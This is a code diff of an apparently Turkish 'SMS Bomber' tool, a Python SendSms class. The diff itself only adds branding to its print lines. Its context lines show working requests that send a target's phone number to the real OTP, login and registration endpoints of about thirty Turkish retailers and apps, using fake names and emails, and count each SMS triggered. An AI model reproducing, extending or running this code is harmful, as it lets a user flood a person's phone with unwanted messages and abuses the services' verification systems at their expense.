@@ -33,9 +33,9 @@ class SendSms():
         	})
         try:
             BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dsmartgo.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dsmartgo.com.tr || yıldırımLord/Papatya SMS Bomber")
         except AttributeError:
-            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dsmartgo.com.tr")
+            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dsmartgo.com.tr || yıldırımLord/Papatya SMS Bomber")
             self.adet += 1
         
 
@@ -53,12 +53,12 @@ class SendSms():
                 "next": ""
             })
             if kigili.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com || yıldırımLord/Papatya SMS Bomber")
         
 
     #kahvedunyasi.com
@@ -69,12 +69,12 @@ class SendSms():
                 "token_type": "register_token"
             })
             if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:    
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com || yıldırımLord/Papatya SMS Bomber")
         
 
     #naosstars.com
@@ -93,12 +93,12 @@ class SendSms():
                 "confirm": "true"
             })
             if naosstars.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> shop.naosstars.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> shop.naosstars.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1 
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> shop.naosstars.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> shop.naosstars.com || yıldırımLord/Papatya SMS Bomber")
           
         
     #wmf.com.tr
@@ -116,12 +116,12 @@ class SendSms():
                 "phone": f"0{self.phone}"
             })
             if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1   
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr || yıldırımLord/Papatya SMS Bomber")
          
     
     #istegelsin.com
@@ -130,12 +130,12 @@ class SendSms():
             json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(self.phone)}}
             r = requests.post("https://prod.fasapi.net:443/",  json=json)
             if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net || yıldırımLord/Papatya SMS Bomber")
     
     
     #bim
@@ -143,12 +143,12 @@ class SendSms():
         try:
             bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
             if bim.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net || yıldırımLord/Papatya SMS Bomber")
             
         
     #ceptesok.com
@@ -156,12 +156,12 @@ class SendSms():
         try:
             r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": self.phone, "token_type": "register_token"})
             if len(r.json()["meta"]["messages"]["success"]) != 0:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ceptesok.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ceptesok.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ceptesok.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ceptesok.com || yıldırımLord/Papatya SMS Bomber")
             
     
     #tiklagelsin.com
@@ -176,12 +176,12 @@ class SendSms():
                         }
             tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
             if tiklagelsin.json()["data"]["generateOtp"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com || yıldırımLord/Papatya SMS Bomber")
             
     
     #migros.com.tr
@@ -189,12 +189,12 @@ class SendSms():
         try:
             migros = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp",  json={"phoneNumber": self.phone})
             if migros.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr || yıldırımLord/Papatya SMS Bomber")
             
     
     #a101.com.tr
@@ -204,12 +204,12 @@ class SendSms():
             data = {"phone": f"0{self.phone}", "next": "/a101-kapida"}
             r = requests.post(url,data=data)
             if (r.status_code) == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise 
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr || yıldırımLord/Papatya SMS Bomber")
 
 
     #englishhome.com
@@ -218,12 +218,12 @@ class SendSms():
             data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
             home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
             if home.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com || yıldırımLord/Papatya SMS Bomber")
             
             
     #sakasu.com.tr
@@ -232,12 +232,12 @@ class SendSms():
             data = {"phone": self.phone}
             su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
             if su.json()["status"] == "ok":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr || yıldırımLord/Papatya SMS Bomber")
             
     
     #rentiva.com
@@ -248,12 +248,12 @@ class SendSms():
             json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": self.phone, "type": 1}
             rentiva = requests.post(url, headers=headers, json=json)
             if rentiva.json()["success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rentiva.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rentiva.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com || yıldırımLord/Papatya SMS Bomber")
             
     
     #bineq.tech
@@ -263,12 +263,12 @@ class SendSms():
             headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
             bineq = requests.post(url, headers=headers)
             if bineq.json()["IsSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech || yıldırımLord/Papatya SMS Bomber")
             
             
     #superpedestrian.com
@@ -278,12 +278,12 @@ class SendSms():
             json={"phone_number": f"+90{self.phone}"}
             link = requests.post(url, json=json)
             if link.json()["detail"] == "Ok":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> consumer-auth.linkfleet.de")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> consumer-auth.linkfleet.de || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> consumer-auth.linkfleet.de")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> consumer-auth.linkfleet.de || yıldırımLord/Papatya SMS Bomber")
 
             
     #loncamarket.com
@@ -293,12 +293,12 @@ class SendSms():
             json={"Address": self.phone, "ConfirmationType": 0}
             lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
             if lonca.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> loncamarket.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> loncamarket.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> loncamarket.com")   
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> loncamarket.com || yıldırımLord/Papatya SMS Bomber")   
             
     
     #dgnonline.com
@@ -309,12 +309,12 @@ class SendSms():
             data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": self.phone}
             dgn = requests.post(url, headers=headers, data=data)
             if dgn.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> odeme.dgnonline.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> odeme.dgnonline.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> odeme.dgnonline.com")  
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> odeme.dgnonline.com || yıldırımLord/Papatya SMS Bomber")  
             
     
     #yaanimail.com
@@ -325,12 +325,12 @@ class SendSms():
             json={"action": "create", "email": f"{''.join(choice(ascii_lowercase) for i in range(19))}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": self.mail}, {"type": "msisdn", "value": f"90{self.phone}"}]}
             r = requests.post(url, headers=headers, json=json)
             if r.status_code == 204:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yaanimail.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yaanimail.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yaanimail.com")  
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yaanimail.com || yıldırımLord/Papatya SMS Bomber")  
             
              
     #defacto.com.tr
@@ -341,12 +341,12 @@ class SendSms():
             data = {"mobilePhone": self.phone}
             r = requests.post(url, headers=headers, data=data)
             if r.json()["Data"]["IsSMSSend"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> defacto.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> defacto.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> defacto.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> defacto.com.tr || yıldırımLord/Papatya SMS Bomber")
     
     
     #mopas.com.tr
@@ -354,12 +354,12 @@ class SendSms():
         try:
             r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=")
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr || yıldırımLord/Papatya SMS Bomber")
             
     
     #icq.net
@@ -370,12 +370,12 @@ class SendSms():
             json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{self.phone}", "route": "sms"}, "reqId": "25299-1669396271"}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["status"]["code"] == 20000:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net || yıldırımLord/Papatya SMS Bomber")
             
     
     #boyner.com
@@ -386,12 +386,12 @@ class SendSms():
             json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": self.phone, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> boyner.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> boyner.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> boyner.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> boyner.com || yıldırımLord/Papatya SMS Bomber")
             
 
     #watsons.com.tr
@@ -402,12 +402,12 @@ class SendSms():
             json={"countryCode": "TR", "phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json)
             if r.status_code == 201:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> watsons.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> watsons.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> watsons.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> watsons.com.tr || yıldırımLord/Papatya SMS Bomber")
             
     
     #buyursungelsin.com
@@ -418,12 +418,12 @@ class SendSms():
             data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{self.phone}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
             r = requests.post(url, headers=headers, data=data)
             if (r.status_code) == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.buyursungelsin.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.buyursungelsin.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com || yıldırımLord/Papatya SMS Bomber")
             
     
     #idealdata.com.tr
@@ -431,12 +431,12 @@ class SendSms():
         try:
             r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{self.phone}")
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> osmgck.idealdata.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> osmgck.idealdata.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> osmgck.idealdata.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> osmgck.idealdata.com.tr || yıldırımLord/Papatya SMS Bomber")
             
     
     #pinarsu.com.tr
@@ -447,12 +447,12 @@ class SendSms():
             json={"MobilePhone": self.phone}
             r = requests.post(url, headers=headers, json=json)
             if r.text == "true":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pinarsumobileservice.yasar.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pinarsumobileservice.yasar.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pinarsumobileservice.yasar.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pinarsumobileservice.yasar.com.tr || yıldırımLord/Papatya SMS Bomber")
             
     
     #suiste.com
@@ -463,12 +463,12 @@ class SendSms():
             data = {"action": "register", "gsm": self.phone}
             r = requests.post(url, headers=headers, data=data)
             if r.json()["code"] == "common.success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com || yıldırımLord/Papatya SMS Bomber")
             
             
     #hayatsu.com.tr
@@ -478,12 +478,12 @@ class SendSms():
             json={"mobilePhoneNumber": self.phone}
             r = requests.post(url, json=json)
             if (r.json()["IsSuccessful"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr || yıldırımLord/Papatya SMS Bomber")
             
             
     #pisir.com
@@ -491,12 +491,12 @@ class SendSms():
         try:
             r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": self.phone})
             if r.json()["ok"] == "1":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com || yıldırımLord/Papatya SMS Bomber")
                 
     
     #KimGbIster
@@ -504,12 +504,12 @@ class SendSms():
         try:
             r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com || yıldırımLord/Papatya SMS Bomber")
 
 
     #ikinciyeni.com
@@ -519,12 +519,12 @@ class SendSms():
             json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": self.phone}
             r = requests.post(url, json=json)
             if (r.json()["isSucceed"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> apigw.ikinciyeni.com")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> apigw.ikinciyeni.com || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> apigw.ikinciyeni.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> apigw.ikinciyeni.com || yıldırımLord/Papatya SMS Bomber")
             
             
     #terrapizza.com.tr
@@ -534,12 +534,12 @@ class SendSms():
             json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(self.phone), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
             r = requests.post(url,  json=json)
             if (r.status_code) == 201:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.terrapizza.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.terrapizza.com.tr || yıldırımLord/Papatya SMS Bomber")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.terrapizza.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.terrapizza.com.tr || yıldırımLord/Papatya SMS Bomber")
             
             
     #ipragaz.com.tr
